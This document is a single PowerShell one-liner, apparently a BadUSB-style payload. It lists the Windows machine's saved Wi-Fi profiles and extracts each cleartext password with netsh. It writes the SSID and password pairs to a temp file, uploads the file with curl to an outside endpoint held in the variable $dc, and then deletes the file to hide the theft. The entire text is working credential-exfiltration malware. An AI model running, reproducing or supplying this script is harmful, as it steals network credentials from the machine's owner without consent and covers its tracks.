$outfile = ""; $a = 0; $ws = (netsh wlan show profiles) -replace ".*:\s+"; foreach ($s in $ws) { if ($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5) { $ssid = $s.Trim(); if ($s -Match ":") { $ssid = $s.Split(":")[1].Trim() } $pw = (netsh wlan show profiles name=$ssid key=clear); $pass = "None"; foreach ($p in $pw) { if ($p -Match "Key Content") { $pass = $p.Split(":")[1].Trim(); $outfile += "SSID: $ssid : Password: $pass`n" } } }$a++; }; $Path = "$env:temp\wifi.txt"; $outfile | Out-File -FilePath $Path -Encoding ASCII -Append; curl.exe -F file1=@"$Path" $dc;Remove-Item -Path $Path -force